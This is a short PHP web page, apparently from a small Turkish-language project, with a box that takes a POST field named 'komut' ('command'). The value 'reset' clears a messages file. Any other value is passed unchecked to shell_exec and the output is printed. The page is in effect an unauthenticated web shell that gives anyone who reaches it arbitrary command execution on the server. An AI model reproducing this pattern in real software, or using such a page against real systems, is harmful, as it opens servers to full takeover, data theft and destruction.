<link rel="stylesheet" href="../styles/styles.css">
<button style="position: relative;width: 96%;left:2%;" class="yesil-kutu" onclick="location.href='/index.html';"><</button>
<div class="renkli-kutu" style="position: absolute;top: 10%;width: 98%;height: 85%;">
<?php
$komut=$_POST["komut"];
if($komut=="reset"){
  shell_exec("cd .. && printf > data/mesajlar.txt");
  echo "Mesajlar sıfırlandı...";
}
else{
  echo shell_exec("cd .. && ".$komut);
}
?></div>